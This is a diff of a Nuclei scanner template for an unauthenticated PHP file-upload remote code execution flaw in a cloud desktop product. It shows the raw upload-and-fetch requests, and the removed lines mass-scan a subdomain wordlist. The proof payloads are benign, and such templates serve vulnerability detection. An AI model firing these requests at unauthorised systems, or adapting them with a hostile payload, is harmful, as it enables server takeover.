@@ -1,47 +1,45 @@
 id: core-chuangtian-cloud-rce
 
 info:
-  name: Core Chuangtian Cloud Desktop System RCE
+  name: Core Chuangtian Cloud Desktop System - Remote Code Execution
   author: pikpikcu
   severity: critical
-  reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
-  tags: rce
+  description: Core Chuangtian Cloud Desktop System is susceptible to remote code execution vulnerabilities.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: rce,fileupload,intrusive,cloud,chuangtian,vuln
+variables:
+  string: "core-chuangtian-cloud-rce"
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+http:
+  - raw:
       - |
         POST /Upload/upload_file.php?l=test HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
+        Host: {{Hostname}}
         Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
         Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,fil;q=0.8
         Cookie: think_language=zh-cn; PHPSESSID_NAMED=h9j8utbmv82cb1dcdlav1cgdf6
-        Connection: close
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv
-        Content-Length: 183
 
         ------WebKitFormBoundaryfcKRltGv
-        Content-Disposition: form-data; name="file"; filename="test.php"
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
         Content-Type: image/avif
 
-        <?php phpinfo(); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         ------WebKitFormBoundaryfcKRltGv--
       - |
-        GET /Upload/test/test.php HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
-    matchers-condition: and
+        GET /Upload/test/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
     matchers:
       - type: word
-        part: body
+        part: body_2
         words:
-          - "PHP Version"
-      - type: status
-        status:
-          - 200
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100d646580ef36f5235e9e22bebae5d4f1ff5e725364e7ee96404b4455165d8e67f022100fec4bb071d0d8e1064c38b53fd978154924cd75fc8d0e4d3c14dffaa9a8d5645:922c64590222798bb761d5b6d8e72950
